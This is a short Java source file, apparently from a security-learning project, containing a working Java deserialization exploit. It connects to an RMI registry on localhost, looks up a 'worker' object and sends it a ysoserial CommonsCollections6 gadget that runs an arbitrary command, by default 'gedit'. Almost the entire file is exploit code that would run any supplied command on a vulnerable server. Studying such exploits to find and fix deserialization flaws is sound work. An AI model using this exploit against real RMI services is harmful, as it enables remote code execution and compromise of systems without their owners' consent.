package com.gypsyengineer.ql.fun.java.rmi;

import ysoserial.payloads.CommonsCollections6;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class ExploitWorker {

    public static void main(String... args) throws Exception {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
        Worker worker = (Worker) registry.lookup("worker");
        String command = args.length > 0 ? args[0] : "gedit";
        Object payload = new CommonsCollections6().getObject(command);
        worker.process(payload);
    }
}
